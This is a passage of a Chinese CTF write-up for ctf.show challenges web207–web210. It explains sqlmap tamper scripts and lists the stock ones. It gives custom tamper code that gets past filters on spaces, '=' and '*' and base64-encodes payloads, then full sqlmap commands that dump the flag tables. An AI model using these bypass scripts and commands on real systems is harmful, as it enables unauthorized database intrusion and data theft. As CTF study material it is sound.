<span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>): <span class="comment"># 用于篡改Payload、以及请求头的主要函数</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>把他保存在sqlmap\tamper路径下,然后使用的时候就加上 –tamper&#x3D;mytamper就好了</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">randomIP</span>():</span><br><span class="line">    numbers = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> numbers <span class="keyword">or</span> numbers[<span class="number">0</span>] <span class="keyword">in</span> (<span class="number">10</span>, <span class="number">172</span>, <span class="number">192</span>):</span><br><span class="line">        numbers = random.sample(xrange(<span class="number">1</span>, <span class="number">255</span>), <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span>.join(<span class="built_in">str</span>(_) <span class="keyword">for</span> _ <span class="keyword">in</span> numbers)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>分别包括import部分 __priority__属性 dependencies函数 tamper函数以及用户自定义的函数</p>
<h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>这一部分我们可以导入sqlmap的内部库,sqlmap为我们提供了很多封装好的函数和数据模型,比如下文的PRORITY就来源于 selmap&#x2F;lib&#x2F;core&#x2F;enums.py</p>
<h3 id="PRIORITY"><a href="#PRIORITY" class="headerlink" title="PRIORITY"></a>PRIORITY</h3><p>PRIORITY是定义tamper的优先级,PRIORITY有以下几个参数</p>
<ul>
<li>LOWEST &#x3D; -100</li>
<li>LOWER &#x3D; -50</li>
<li>LOW &#x3D; -10</li>
<li>NORMAL &#x3D; 0</li>
<li>HIGH &#x3D; 10</li>
<li>HIGHER &#x3D; 50 </li>
<li>HIGHER &#x3D; 50</li>
<li>HIGHEST &#x3D; 100</li>
</ul>
<p>如果使用了多个tamper,sqlmap会根据每一个tamper定义的PRIORITY的参数等级来优先使用等级较高的tamper,如果你有两个tamper需要同时用,需要注意</p>
<h3 id="dependencies"><a href="#dependencies" class="headerlink" title="dependencies"></a>dependencies</h3><p>dependencies主要是提示用户,增tamper支持哪些数据可以支持哪些数据库</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> DBMS</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    singleTimeWarnMessage(<span class="string">&quot;这是我的tamper提示&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>DBMS.MYSQL这个参数代表的是Mysql，其他数据库的参数也可以看这个\sqlmap\lib\core\enums.py</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407203541626.png" alt="image-20220407203541626"></p>
<h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><p>tamper这个函数是tamper最重要的函数,你要实现的功能,全部写在这个函数里.payload这个参数就是sqlmap的原始注入payload,我们要实现绕过,一般就是针对这个payload的修改.kwargs是针对http头部的修改,如果你是bypass,是通过修改http头,就需要使用这个</p>
<h3 id="基于payload"><a href="#基于payload" class="headerlink" title="基于payload"></a>基于payload</h3><p>先来基于修改payload来绕过替换关键字，我使用sqlilab的第一关，并且修改了部分代码来把恶意关键字替换为空来避免联合查询，如图</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407203858410.png" alt="image-20220407203858410"></p>
<p>编写tamper来双写绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;select&#x27;</span>,<span class="string">&#x27;seleselectct&#x27;</span>)</span><br><span class="line">    payload = payload.replace(<span class="string">&#x27;union&#x27;</span>,<span class="string">&#x27;ununionion&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>没有使用tamper之前，我们加上<code>--tech=U</code>来让sqlmap只测试联合查询注入，<code>--flush-session</code>意思是每次刷新会话，清理上次的缓存。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --dbms=mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407203933797.png" alt="image-20220407203933797"></p>
<p>从burp的流量中看到payload是没有双写的，必然会注入失败。而使用了tamper之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://php.local/Less-1/?id=1 --tech=U --flush-session --proxy=http://127.0.0.1:8080 --random-agent --tamper=my --dbms=mysql</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407203955653.png" alt="image-20220407203955653"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407204001885.png" alt="image-20220407204001885"></p>
<h3 id="基于http头"><a href="#基于http头" class="headerlink" title="基于http头"></a>基于http头</h3><p>我没使用sqlmap\tamper\xforwardedfor.py的tamper来讲解</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    headers = kwargs.get(<span class="string">&quot;headers&quot;</span>, &#123;&#125;)</span><br><span class="line">    headers[<span class="string">&quot;X-Forwarded-For&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Client-Ip&quot;</span>] = randomIP()</span><br><span class="line">    headers[<span class="string">&quot;X-Real-Ip&quot;</span>] = randomIP()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure>

<p>从kwargs中取出headers数组，然后修改了xff值达到随机IP的效果，不再赘述。</p>
<h2 id="Tamper-速查"><a href="#Tamper-速查" class="headerlink" title="Tamper 速查"></a>Tamper 速查</h2><table>
<thead>
<tr>
<th>脚本名称</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>apostrophemask.py</td>
<td>用utf8代替引号</td>
</tr>
<tr>
<td>equaltolike.py</td>
<td>like 代替等号</td>
</tr>
<tr>
<td>space2dash.py</td>
<td>绕过过滤’&#x3D;’ 替换空格字符(“)，(‘’ - ‘)后跟一个破折号注释，一个随机字符串和一个新行(‘n’)</td>
</tr>
<tr>
<td>greatest.py</td>
<td>绕过过滤’&gt;’ ,用GREATEST替换大于号。</td>
</tr>
<tr>
<td>space2hash.py</td>
<td>空格替换为#号 随机字符串 以及换行符</td>
</tr>
<tr>
<td>apostrophenullencode.py</td>
<td>绕过过滤双引号，替换字符和双引号。</td>
</tr>
<tr>
<td>halfversionedmorekeywords.py</td>
<td>当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</td>
</tr>
<tr>
<td>space2morehash.py</td>
<td>空格替换为 #号 以及更多随机字符串 换行符</td>
</tr>
<tr>
<td>appendnullbyte.py</td>
<td>在有效负荷结束位置加载零字节字符编码</td>
</tr>
<tr>
<td>ifnull2ifisnull.py</td>
<td>绕过对 IFNULL 过滤。 替换类似’IFNULL(A, B)’为’IF(ISNULL(A), B, A)’</td>
</tr>
<tr>
<td>space2mssqlblank.py</td>
<td>空格替换为其它空符号</td>
</tr>
<tr>
<td>base64encode.py</td>
<td>用base64编码替换</td>
</tr>
<tr>
<td>space2mssqlhash.py</td>
<td>替换空格</td>
</tr>
<tr>
<td>modsecurityversioned.py</td>
<td>过滤空格，包含完整的查询版本注释</td>
</tr>
<tr>
<td>space2mysqlblank.py</td>
<td>空格替换其它空白符号(mysql)</td>
</tr>
<tr>
<td>between.py</td>
<td>用between替换大于号(&gt;)</td>
</tr>
<tr>
<td>space2mysqldash.py</td>
<td>替换空格字符(“)(‘ - ‘)后跟一个破折号注释一个新行(‘ n’)</td>
</tr>
<tr>
<td>multiplespaces.py</td>
<td>围绕SQL关键字添加多个空格</td>
</tr>
<tr>
<td>space2plus.py</td>
<td>用+替换空格</td>
</tr>
<tr>
<td>bluecoat.py</td>
<td>代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换&#x3D;为like</td>
</tr>
<tr>
<td>nonrecursivereplacement.py</td>
<td>取代predefined SQL关键字with表示 suitable for替代(例如 .replace(“SELECT”、””)) filters</td>
</tr>
<tr>
<td>space2randomblank.py</td>
<td>代替空格字符(“”)从一个随机的空白字符可选字符的有效集</td>
</tr>
<tr>
<td>sp_password.py</td>
<td>追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</td>
</tr>
<tr>
<td>chardoubleencode.py</td>
<td>双url编码(不处理以编码的)</td>
</tr>
<tr>
<td>unionalltounion.py</td>
<td>替换UNION ALL SELECT UNION SELECT</td>
</tr>
<tr>
<td>charencode.py</td>
<td>url编码</td>
</tr>
<tr>
<td>randomcase.py</td>
<td>随机大小写</td>
</tr>
<tr>
<td>unmagicquotes.py</td>
<td>宽字符绕过 GPC addslashes</td>
</tr>
<tr>
<td>randomcomments.py</td>
<td>用 <code>/**/</code> 分割sql关键字</td>
</tr>
<tr>
<td>charunicodeencode.py</td>
<td>字符串unicode编码</td>
</tr>
<tr>
<td>securesphere.py</td>
<td>追加特制的字符串</td>
</tr>
<tr>
<td>versionedmorekeywords.py</td>
<td>注释绕过</td>
</tr>
<tr>
<td>space2comment.py</td>
<td>Replaces space character <code>&#39; &#39;</code> with comments <code>/**/</code></td>
</tr>
</tbody></table>
<p>我们来试一下哦 web207.py 大概意思就是把空格用 0x0a代替也就是回车</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload,**kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote , firstspace = <span class="literal">False</span>, <span class="literal">False</span> ,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  retVal</span><br></pre></td></tr></table></figure>

<p>我们挂一下代理看看是怎么改的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --proxy=&quot;http://127.0.0.1:8080&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407210406203.png" alt="image-20220407210406203"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span><br></pre></td></tr></table></figure>

<h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><h2 id="小括号闭合-大小写"><a href="#小括号闭合-大小写" class="headerlink" title="小括号闭合,大小写"></a>小括号闭合,大小写</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407210921431.png" alt="image-20220407210921431"></p>
<p>这时你就需要–prefix和–suffix参数了：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch --dbs </span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span><br></pre></td></tr></table></figure>

<h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407215132018.png" alt="image-20220407215132018"></p>
<h2 id="过滤-等号和空格"><a href="#过滤-等号和空格" class="headerlink" title="过滤* 等号和空格"></a>过滤* 等号和空格</h2><p>web209.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload , **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote , doublequote , firstspace = <span class="literal">False</span> ,<span class="literal">False</span> ,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += (<span class="built_in">chr</span>(<span class="number">0x0a</span>)) <span class="comment">#return</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] ==<span class="string">&quot;\&#x27;&quot;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;=&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>) + <span class="string">&#x27;like&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 --dbs </span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav -C ctfshow_flagx --dump</span><br></pre></td></tr></table></figure>

<h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h2 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220407214810805.png" alt="image-20220407214810805"></p>
<p>web210.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = base64.b64encode(payload[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#翻转字符串以utf-8便码成二进制</span></span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#解码成utf-8</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote , firstspqce = <span class="literal">False</span> ,<span class="literal">False</span> ,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspqce:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspqce = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;\&#x27;&quot;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x31</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;=&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span 